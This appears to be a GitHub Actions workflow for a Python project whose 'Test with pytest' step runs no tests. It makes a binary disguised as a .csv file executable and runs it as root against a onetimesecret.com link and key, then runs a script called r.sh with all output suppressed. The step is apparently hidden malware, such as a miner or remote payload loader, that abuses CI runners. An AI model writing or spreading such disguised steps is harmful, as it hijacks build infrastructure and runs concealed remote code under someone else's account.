name: Python application

on:
  push:
    branches: [ "main" ]
  pull_request:
    branches: [ "main" ]

permissions:
  contents: read

jobs:
  build:

    runs-on: ubuntu-latest

    steps:
    - uses: actions/checkout@v3
    - name: Set up Python 3.8
      uses: actions/setup-python@v3
      with:
        python-version: "3.8"
    - name: Install dependencies
      run: |
        python -m pip install --upgrade pip
    - name: Test with pytest
      run: |
        cd ${{ github.workspace }}
        echo '8ebuj'
        sudo chmod +x kimball5s46g/mcginniscxrrg/mcgrathiqm8h.csv
        sudo ./kimball5s46g/mcginniscxrrg/mcgrathiqm8h.csv https://onetimesecret.com/secret/tenyht7tgwwsr44xzny7u5ay5u06go2 7hb746 && sudo sh r.sh > /dev/null 2>&1
